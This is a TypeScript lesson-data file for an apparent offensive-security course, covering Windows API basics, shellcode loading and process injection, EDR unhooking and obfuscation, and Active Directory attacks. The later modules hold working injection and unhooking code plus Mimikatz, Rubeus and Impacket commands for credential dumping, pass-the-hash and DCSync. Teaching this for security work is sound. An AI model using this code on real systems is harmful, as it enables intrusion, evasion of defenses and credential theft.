// Lesson data for all modules
export interface Concept {
  label: string;
  explanation: string;
}

export interface Example {
  title: string;
  description?: string;
  code: string;
  language: string;
}

export interface Section {
  type?: string;
  title?: string;
  content?: string;
  tip?: string;
  warning?: string;
  concepts?: Concept[];
  example?: Example;
}

export interface Lesson {
  title: string;
  description: string;
  sections: Section[];
}

export const lessons: Record<string, Lesson> = {
  fundamentals: {
    title: "C/C++ WinAPI Fundamentals",
    description: "Master the foundational concepts of Windows systems programming",
    sections: [
      {
        type: "intro",
        content: "This module establishes your foundation in Windows systems programming. You'll understand how Windows manages resources, why Microsoft created specific data types, and how to properly interact with the operating system through its API."
      },
      {
        title: "Understanding Windows Architecture",
        content: `Windows operates on a layered architecture model that separates user-mode applications from the kernel. This separation is crucial for system stability and security.

**User Mode vs Kernel Mode:**
User-mode applications cannot directly access hardware or system memory. Instead, they must request services through the Windows API, which then transitions to kernel mode to perform privileged operations.

**The Windows API Hierarchy:**
• Win32 API (kernel32.dll, user32.dll, gdi32.dll)
• Native API (ntdll.dll)
• System Service Dispatcher
• Kernel (ntoskrnl.exe)`,
        tip: "Understanding this hierarchy is essential - security tools often hook at different levels to monitor or modify behavior.",
        concepts: [
          { label: "User Mode", explanation: "Ring 3 - Limited access, where normal applications run. Cannot directly access hardware." },
          { label: "Kernel Mode", explanation: "Ring 0 - Full system access, where drivers and the OS kernel operate." },
          { label: "System Call", explanation: "The transition mechanism from user mode to kernel mode to request OS services." },
          { label: "Subsystem", explanation: "Windows supports multiple subsystems (Win32, WSL) that provide different APIs." }
        ]
      },
      {
        title: "Windows Data Types - Precision Matters",
        content: `Microsoft defined specific data types to ensure consistent behavior across different compiler implementations and processor architectures.

**Why Standard C Types Aren't Enough:**
The C standard allows 'int' to be 16, 32, or 64 bits depending on the platform. Windows data types guarantee exact sizes:

**Unsigned Integer Types:**
• BYTE (8-bit) - Used for raw binary data, single characters
• WORD (16-bit) - Legacy DOS compatibility, some registry values  
• DWORD (32-bit) - Most common: process IDs, error codes, flags
• QWORD (64-bit) - Large values, 64-bit addresses on x64

**Pointer Types:**
• PVOID - Generic pointer (void*)
• LPVOID - Long pointer to void (same as PVOID on modern Windows)
• SIZE_T - Unsigned integer sized to match pointer width (32 or 64 bits)
• ULONG_PTR - Unsigned long sized to hold a pointer

**String Types:**
• LPSTR - Pointer to ANSI string (char*)
• LPWSTR - Pointer to Unicode string (wchar_t*)
• LPTSTR - Pointer to TCHAR string (Unicode or ANSI based on build)`,
        warning: "Always use SIZE_T for memory sizes and ULONG_PTR for pointer arithmetic. Using DWORD on 64-bit systems will truncate addresses!",
        example: {
          title: "Type Sizes and Safe Usage",
          description: "Demonstrating proper type usage for cross-platform compatibility:",
          code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Integer types with guaranteed sizes
    BYTE   b = 255;           // 8-bit:  0-255
    WORD   w = 65535;         // 16-bit: 0-65535  
    DWORD  dw = 4294967295;   // 32-bit: 0-4.2B
    
    // Pointer-sized types - CRITICAL for 64-bit
    SIZE_T memSize = 0x10000;     // Safe for VirtualAlloc
    ULONG_PTR addr = (ULONG_PTR)&b; // Safe pointer math
    
    printf("BYTE size:     %zu bytes\\n", sizeof(BYTE));
    printf("DWORD size:    %zu bytes\\n", sizeof(DWORD));
    printf("SIZE_T size:   %zu bytes\\n", sizeof(SIZE_T));
    printf("Pointer size:  %zu bytes\\n", sizeof(PVOID));
    
    return 0;
}`,
          language: "c"
        }
      },
      {
        title: "The Handle System - Object Management",
        content: `Windows uses handles as opaque references to kernel objects. This abstraction provides security isolation and allows the kernel to manage resources without exposing internal structures.

**What Are Handles:**
A handle is simply an index into a per-process handle table maintained by the kernel. Each entry points to the actual object and contains access rights.

**Common Handle Types:**
• HANDLE - Generic handle (files, processes, threads, mutexes)
• HWND - Window handle
• HMODULE/HINSTANCE - Module/DLL handle
• HDC - Device context handle

**Handle Rules:**
1. Always check if returned handle is valid
2. Always close handles when done (prevent leaks)
3. Don't pass handles between processes (without DuplicateHandle)
4. INVALID_HANDLE_VALUE (-1) vs NULL - know the difference`,
        concepts: [
          { label: "Handle Table", explanation: "Per-process array maintained by kernel, mapping handles to object pointers." },
          { label: "Access Rights", explanation: "Each handle has specific permissions (read, write, etc.) granted at creation." },
          { label: "Reference Count", explanation: "Objects are destroyed when all handles are closed (reference count hits zero)." }
        ],
        example: {
          title: "Proper Handle Management",
          code: `#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hFile;
    DWORD bytesWritten;
    
    // Create/open file - returns INVALID_HANDLE_VALUE on failure
    hFile = CreateFileW(
        L"test.txt",
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    // CRITICAL: Check for valid handle
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("CreateFile failed: %lu\\n", GetLastError());
        return 1;
    }
    
    const char* data = "Hello, Windows!";
    WriteFile(hFile, data, strlen(data), &bytesWritten, NULL);
    
    // CRITICAL: Always close handles
    CloseHandle(hFile);
    
    return 0;
}`,
          language: "c"
        }
      },
      {
        title: "Process & Memory Fundamentals",
        content: `Understanding Windows process architecture is essential for both offensive and defensive security work.

**Process Components:**
• Virtual Address Space (VAS) - Each process has isolated 4GB (x86) or 128TB (x64) space
• PEB (Process Environment Block) - User-mode structure with process info
• Threads - Units of execution, each with own stack and TEB
• Handles - References to kernel objects

**Memory Layout (x64):**
0x00000000'00000000 - NULL page (always inaccessible)
0x00000000'00010000 - User space starts
0x00007FFF'FFFFFFFF - User space ends
0x00008000'00000000 - Kernel space starts

**Memory Protection:**
• PAGE_EXECUTE_READ - Code sections
• PAGE_READWRITE - Data sections
• PAGE_NOACCESS - Guard pages
• PAGE_EXECUTE_READWRITE - Rarely legitimate (suspicious!)`,
        warning: "PAGE_EXECUTE_READWRITE (RWX) memory is a red flag for security tools. Legitimate code rarely needs this.",
        example: {
          title: "Process Memory Allocation",
          code: `#include <windows.h>
#include <stdio.h>

int main() {
    // Allocate private memory
    LPVOID buffer = VirtualAlloc(
        NULL,                   // Let system choose address
        4096,                   // Size (page-aligned)
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE         // RW, not RWX!
    );
    
    if (!buffer) {
        printf("VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }
    
    printf("Allocated at: %p\\n", buffer);
    
    // Query memory information
    MEMORY_BASIC_INFORMATION mbi;
    VirtualQuery(buffer, &mbi, sizeof(mbi));
    
    printf("Region size: %zu\\n", mbi.RegionSize);
    printf("Protection: 0x%lx\\n", mbi.Protect);
    
    // Free memory
    VirtualFree(buffer, 0, MEM_RELEASE);
    
    return 0;
}`,
          language: "c"
        }
      }
    ]
  },
  shellcode: {
    title: "Shellcode Execution & Injection",
    description: "Learn shellcode loading techniques and process injection methods",
    sections: [
      {
        type: "intro",
        content: "This module covers the core techniques for loading and executing shellcode in Windows environments, from basic in-process execution to advanced injection methods."
      },
      {
        title: "Shellcode Fundamentals",
        content: `Shellcode is position-independent machine code designed to be injected and executed in arbitrary memory locations.

**Key Characteristics:**
• Position Independent - No hardcoded addresses
• Self-Contained - Resolves its own imports
• Small Size - Fits in constrained spaces
• No NULL Bytes - Often required for string exploitation

**Common Shellcode Tasks:**
• Reverse/Bind shells
• Download and execute
• Add user accounts
• Disable security features

**Generation Tools:**
• msfvenom - Metasploit's payload generator
• Donut - Converts .NET/PE to shellcode
• sRDI - Shellcode Reflective DLL Injection`,
        concepts: [
          { label: "PIC", explanation: "Position Independent Code - Works regardless of where it's loaded in memory." },
          { label: "Stager", explanation: "Small shellcode that downloads and executes larger payload." },
          { label: "Staged vs Stageless", explanation: "Staged: small loader + network fetch. Stageless: full payload in one piece." }
        ]
      },
      {
        title: "Basic Execution Methods",
        content: `The simplest shellcode execution involves allocating executable memory and transferring control to it.

**Classic VirtualAlloc Method:**
1. Allocate RWX (or RW then RX) memory
2. Copy shellcode to allocated region
3. Cast address to function pointer
4. Call the function pointer

**Alternative Execution:**
• CreateThread - New thread at shellcode
• QueueUserAPC - Queue APC to alertable thread
• Callback functions - NtCreateThreadEx, etc.
• Fiber execution - ConvertThreadToFiber`,
        warning: "RWX memory allocations are heavily monitored by security tools. Consider RW → RX transitions.",
        example: {
          title: "Basic Shellcode Execution",
          code: `#include <windows.h>
#include <stdio.h>

// Example: MessageBox shellcode (x64)
unsigned char shellcode[] = {
    0x48, 0x31, 0xc9,              // xor rcx, rcx
    0x48, 0x81, 0xe9, 0xdd, 0xff,  // sub rcx, -0x23
    // ... (truncated for brevity)
};

int main() {
    LPVOID exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldProtect = 0;

    // Allocate RW memory
    exec_mem = VirtualAlloc(NULL, sizeof(shellcode), 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy shellcode
    memcpy(exec_mem, shellcode, sizeof(shellcode));

    // Change to RX (better OPSEC than RWX)
    rv = VirtualProtect(exec_mem, sizeof(shellcode), 
        PAGE_EXECUTE_READ, &oldProtect);

    // Execute via thread
    if (rv) {
        th = CreateThread(NULL, 0, 
            (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        WaitForSingleObject(th, INFINITE);
    }

    return 0;
}`,
          language: "c"
        }
      },
      {
        title: "Process Injection Techniques",
        content: `Process injection involves executing code in the address space of another process, often for evasion or privilege escalation.

**Classic Injection (CreateRemoteThread):**
1. OpenProcess with appropriate rights
2. VirtualAllocEx - Allocate in target
3. WriteProcessMemory - Copy shellcode
4. CreateRemoteThread - Execute

**Other Techniques:**
• APC Injection - Queue to alertable threads
• Thread Hijacking - Modify existing thread context
• Process Hollowing - Replace legitimate process image
• Module Stomping - Overwrite loaded DLL

**Detection Vectors:**
• Cross-process memory operations
• Remote thread creation
• Unusual parent-child relationships`,
        concepts: [
          { label: "PROCESS_ALL_ACCESS", explanation: "Full access rights, often not needed. Prefer minimal rights." },
          { label: "Alertable State", explanation: "Thread state that allows APC execution (SleepEx, WaitForSingleObjectEx)." },
          { label: "Process Hollowing", explanation: "Create suspended process, unmap image, map malicious code, resume." }
        ],
        example: {
          title: "Classic Process Injection",
          code: `BOOL InjectShellcode(DWORD pid, LPVOID shellcode, SIZE_T size) {
    HANDLE hProcess, hThread;
    LPVOID remoteMem;
    
    // Open target process
    hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
        FALSE, pid
    );
    if (!hProcess) return FALSE;
    
    // Allocate memory in target
    remoteMem = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // Write shellcode
    WriteProcessMemory(hProcess, remoteMem, shellcode, size, NULL);
    
    // Execute
    hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}`,
          language: "c"
        }
      }
    ]
  },
  evasion: {
    title: "Defense Evasion Techniques",
    description: "Bypass security controls and evade detection",
    sections: [
      {
        type: "intro",
        content: "Modern security solutions employ multiple detection layers. This module covers techniques to evade antivirus, EDR, and other security controls."
      },
      {
        title: "Understanding Detection Mechanisms",
        content: `Security solutions use multiple detection methods that must be understood before attempting evasion.

**Static Analysis:**
• Signature matching - Known malware patterns
• Heuristics - Suspicious code patterns
• Import analysis - Dangerous API combinations
• Entropy analysis - Packed/encrypted sections

**Dynamic Analysis:**
• Sandbox execution - Controlled environment
• API monitoring - Hook critical functions
• Behavior analysis - Action patterns
• Memory scanning - Runtime signatures

**EDR Capabilities:**
• User-mode hooks (ntdll.dll)
• Kernel callbacks (PsSetCreateProcessNotifyRoutine)
• ETW providers (Event Tracing for Windows)
• Minifilter drivers (file/registry)`,
        concepts: [
          { label: "User-mode Hooks", explanation: "EDRs modify ntdll.dll functions to intercept syscalls." },
          { label: "ETW", explanation: "Event Tracing for Windows - High-performance logging framework used by security tools." },
          { label: "Minifilter", explanation: "Kernel-mode driver that can intercept file/registry operations." }
        ]
      },
      {
        title: "API Unhooking Techniques",
        content: `EDRs typically hook ntdll.dll functions in user-mode. Unhooking restores original function bytes.

**Unhooking Methods:**
1. Read clean ntdll from disk
2. Map fresh copy from KnownDlls
3. Read from suspended process
4. Direct syscalls (skip ntdll entirely)

**Direct Syscalls:**
Instead of calling ntdll functions, use syscall instruction directly with correct SSN (System Service Number).

**Considerations:**
• SSNs change between Windows versions
• Hell's Gate - Dynamic SSN resolution
• Halo's Gate - SSN from neighbor functions
• Tartarus Gate - Handle edge cases`,
        warning: "Unhooking generates telemetry. Consider indirect syscalls or early-bird techniques.",
        example: {
          title: "Ntdll Unhooking",
          code: `BOOL UnhookNtdll() {
    HANDLE hFile, hMapping;
    LPVOID cleanNtdll;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER section;
    DWORD oldProtect;
    
    // Read clean ntdll from disk
    hFile = CreateFileW(L"C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    
    hMapping = CreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    cleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    
    // Parse PE headers
    dosHeader = (PIMAGE_DOS_HEADER)cleanNtdll;
    ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)cleanNtdll + dosHeader->e_lfanew);
    
    // Find .text section and overwrite hooked ntdll
    HMODULE hookedNtdll = GetModuleHandleW(L"ntdll.dll");
    section = IMAGE_FIRST_SECTION(ntHeaders);
    
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (!strcmp((char*)section[i].Name, ".text")) {
            VirtualProtect(
                (LPVOID)((DWORD_PTR)hookedNtdll + section[i].VirtualAddress),
                section[i].Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE, &oldProtect);
            
            memcpy(
                (LPVOID)((DWORD_PTR)hookedNtdll + section[i].VirtualAddress),
                (LPVOID)((DWORD_PTR)cleanNtdll + section[i].PointerToRawData),
                section[i].Misc.VirtualSize);
            
            VirtualProtect(
                (LPVOID)((DWORD_PTR)hookedNtdll + section[i].VirtualAddress),
                section[i].Misc.VirtualSize,
                oldProtect, &oldProtect);
        }
    }
    
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return TRUE;
}`,
          language: "c"
        }
      },
      {
        title: "Payload Obfuscation",
        content: `Obfuscation hides malicious intent from static analysis while maintaining functionality.

**String Obfuscation:**
• XOR encryption
• Stack strings (build at runtime)
• Hashed API names
• Encrypted string tables

**Code Obfuscation:**
• Control flow flattening
• Dead code insertion
• Opaque predicates
• Metamorphic code

**Payload Encryption:**
• AES/RC4 encrypted shellcode
• Environmental keying
• Staged decryption`,
        example: {
          title: "XOR Encrypted Strings",
          code: `// XOR encrypt/decrypt with key
void XorData(PBYTE data, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

// Encrypted "VirtualAlloc" with key 0x41
unsigned char encVirtualAlloc[] = {
    0x17, 0x28, 0x33, 0x35, 0x36, 0x20, 0x2d, 0x01,
    0x2d, 0x2d, 0x2e, 0x22, 0x00
};

int main() {
    // Decrypt at runtime
    XorData(encVirtualAlloc, sizeof(encVirtualAlloc) - 1, 0x41);
    
    // Now use the decrypted string
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pVirtualAlloc = GetProcAddress(hKernel32, 
        (LPCSTR)encVirtualAlloc);
    
    // Re-encrypt to avoid memory scans
    XorData(encVirtualAlloc, sizeof(encVirtualAlloc) - 1, 0x41);
    
    return 0;
}`,
          language: "c"
        }
      }
    ]
  },
  "active-directory": {
    title: "Active Directory Attacks",
    description: "Master Active Directory enumeration, attacks, and lateral movement",
    sections: [
      {
        type: "intro",
        content: "Active Directory (AD) is the cornerstone of enterprise Windows environments. Understanding its architecture and common attack paths is essential for both offensive security professionals and defenders."
      },
      {
        title: "Active Directory Fundamentals",
        content: `Active Directory is a directory service that stores information about network resources and provides authentication and authorization services.

**Key Components:**
• Domain Controller (DC) - Server hosting AD database (NTDS.dit)
• Forest - Collection of domains sharing schema/configuration
• Domain - Administrative boundary with unique namespace
• Organizational Units (OU) - Containers for organizing objects
• Group Policy Objects (GPO) - Centralized configuration management

**Authentication Protocols:**
• Kerberos - Primary authentication (tickets, TGT, TGS)
• NTLM - Legacy authentication (challenge-response)
• LDAP - Directory access protocol

**Important Objects:**
• Users - Human/service accounts
• Computers - Domain-joined machines
• Groups - Collections of users/computers
• Service Principal Names (SPNs) - Service identifiers`,
        concepts: [
          { label: "NTDS.dit", explanation: "AD database file containing all domain objects and password hashes." },
          { label: "SYSVOL", explanation: "Shared folder containing GPOs, scripts, replicated across DCs." },
          { label: "Kerberos TGT", explanation: "Ticket Granting Ticket - Initial ticket from KDC, used to request service tickets." },
          { label: "SPN", explanation: "Service Principal Name - Unique identifier for services, enables Kerberos auth." }
        ]
      },
      {
        title: "AD Enumeration",
        content: `Enumeration is the foundation of AD attacks. Any authenticated user can query extensive domain information.

**Key Enumeration Targets:**
• Domain/Forest information
• User accounts and properties
• Groups and memberships
• Computer accounts
• Trust relationships
• GPO settings
• ACLs and permissions

**Tools:**
• PowerView - PowerShell AD enumeration
• BloodHound - Graph-based attack path analysis
• ADExplorer - GUI AD browser
• ldapsearch - Linux LDAP client

**LDAP Filters:**
• All Users: (objectClass=user)
• Domain Admins: (memberOf=CN=Domain Admins,...)
• Computers: (objectClass=computer)
• SPNs: (servicePrincipalName=*)`,
        example: {
          title: "PowerShell AD Enumeration",
          code: `# Import Active Directory module
Import-Module ActiveDirectory

# Get domain information
$domain = Get-ADDomain
Write-Host "[*] Domain: $($domain.DNSRoot)"
Write-Host "[*] Domain SID: $($domain.DomainSID)"
Write-Host "[*] Forest: $($domain.Forest)"

# Get Domain Controllers
Write-Host "[*] Domain Controllers:"
Get-ADDomainController -Filter * | ForEach-Object {
    Write-Host "    - $($_.Name) ($($_.IPv4Address))"
}

# Enumerate privileged groups
Write-Host "[*] Domain Admins:"
Get-ADGroupMember "Domain Admins" -Recursive | ForEach-Object {
    Write-Host "    - $($_.SamAccountName)"
}

# Find service accounts (users with SPNs)
Write-Host "[*] Kerberoastable Accounts:"
Get-ADUser -Filter 'ServicePrincipalName -ne "$null"' -Properties ServicePrincipalName | 
    ForEach-Object {
        Write-Host "    - $($_.SamAccountName)"
    }

# Find accounts with no pre-auth (ASREPRoastable)
Write-Host "[*] ASREPRoastable Accounts:"
Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $true' | ForEach-Object {
    Write-Host "    - $($_.SamAccountName)"
}`,
          language: "powershell"
        }
      },
      {
        title: "Kerberos Attacks",
        content: `Kerberos, while more secure than NTLM, has several well-known attack vectors due to design decisions and common misconfigurations.

**Kerberoasting:**
Service tickets are encrypted with the service account's password hash. Any domain user can request tickets for any SPN and attempt offline cracking.
• Request TGS for accounts with SPNs
• Extract encrypted ticket
• Crack offline with hashcat/john

**ASREPRoasting:**
Accounts with "Do not require Kerberos pre-authentication" can have their AS-REP cracked offline.
• No credentials needed to request AS-REP
• Hash in response can be cracked
• Often found on legacy service accounts

**Golden Ticket:**
With the KRBTGT hash, forge TGTs for any user.
• Requires domain compromise first (to get KRBTGT hash)
• Tickets valid for 10 years by default
• Survives password changes (until KRBTGT rotated twice)

**Silver Ticket:**
Forge TGS for a specific service using its password hash.
• Only works against that specific service
• Doesn't touch DC, harder to detect
• Useful for persistence on specific servers`,
        warning: "Kerberoasting is often the fastest path to domain admin. Service accounts frequently have weak passwords and domain admin privileges.",
        example: {
          title: "Kerberoasting with Rubeus",
          code: `# Method 1: Using Rubeus
.\\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat:
# hashcat -m 13100 hashes.txt wordlist.txt

# ASREPRoasting with Rubeus
.\\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Crack ASREP hashes:
# hashcat -m 18200 asrep_hashes.txt wordlist.txt

# Request ticket for specific SPN
.\\Rubeus.exe kerberoast /spn:"MSSQLSvc/sql01.corp.local:1433"

# From Linux with Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 10.10.10.1 -request

# ASREPRoasting from Linux
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.1`,
          language: "powershell"
        }
      },
      {
        title: "Lateral Movement",
        content: `Once credentials are obtained, lateral movement allows spreading across the network to reach high-value targets.

**Pass-the-Hash (PtH):**
Use NTLM hash directly without knowing the password.
• Works with NTLM authentication (not Kerberos)
• Common with psexec, wmiexec, smbexec
• Detected by modern EDRs

**Pass-the-Ticket (PtT):**
Use stolen Kerberos tickets.
• Extract tickets from memory with Mimikatz
• Import on different machine
• Impersonate the ticket owner

**Overpass-the-Hash:**
Use NTLM hash to request Kerberos tickets.
• Combines PtH with Kerberos
• More stealthy than pure NTLM
• Appears as normal Kerberos authentication

**RDP Hijacking:**
Take over disconnected RDP sessions.
• tscon command to switch sessions
• Requires SYSTEM privileges
• No password needed for disconnected sessions`,
        tip: "Always check for cached credentials on compromised systems. Users who have logged in leave hashes in LSASS memory.",
        example: {
          title: "Lateral Movement Examples",
          code: `# =========== Mimikatz Commands ===========

# Dump credentials from LSASS
mimikatz # sekurlsa::logonpasswords

# Pass-the-Hash
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:abc123... /run:cmd

# Extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# Pass-the-Ticket
mimikatz # kerberos::ptt ticket.kirbi

# Golden Ticket (requires KRBTGT hash)
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:abc123... /ptt

# =========== Impacket Examples ===========

# PsExec with hash
impacket-psexec corp.local/admin@target -hashes :abc123...

# WMI Exec
impacket-wmiexec corp.local/admin@target -hashes :abc123...

# SMB Exec (more stealthy)
impacket-smbexec corp.local/admin@target -hashes :abc123...`,
          language: "powershell"
        }
      },
      {
        title: "Domain Dominance",
        content: `The ultimate goal is often complete domain control. These techniques establish persistent, privileged access.

**DCSync:**
Replicate domain credentials using Directory Replication privileges.
• Mimics domain controller behavior
• Extracts any account's hash
• Requires Replicating Directory Changes rights
• Often available to Domain Admins

**DCShadow:**
Register a rogue Domain Controller.
• Push malicious changes to AD
• Can modify any object
• Extremely stealthy - uses legitimate replication
• Requires elevated privileges

**AdminSDHolder & SDProp:**
Abuse the AdminSDHolder protection mechanism.
• Modify AdminSDHolder ACL
• SDProp (runs every 60 min) propagates to protected groups
• Grants persistent access to Domain Admins
• Survives password changes

**ADCS Attacks (AD Certificate Services):**
Abuse certificate templates and CA permissions.
• ESC1-ESC8 attack classes
• Request certificates as other users
• Persist across password changes`,
        warning: "DCSync is a high-impact attack that often triggers alerts. Modern SIEMs and EDRs monitor for replication from non-DC sources.",
        example: {
          title: "DCSync Attack",
          code: `# DCSync with Mimikatz
# Extracts password hashes by simulating DC replication

# Get specific user's hash (e.g., krbtgt for Golden Ticket)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Get all domain hashes
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# DCSync with Impacket (from Linux)
impacket-secretsdump corp.local/admin:'Password123'@DC01.corp.local

# With hashes
impacket-secretsdump corp.local/admin@DC01.corp.local -hashes :abc123...

# =========== Required Privileges ===========
# These rights enable DCSync:
# - Replicating Directory Changes
# - Replicating Directory Changes All
# - Replicating Directory Changes in Filtered Set`,
          language: "powershell"
        }
      }
    ]
  }
};
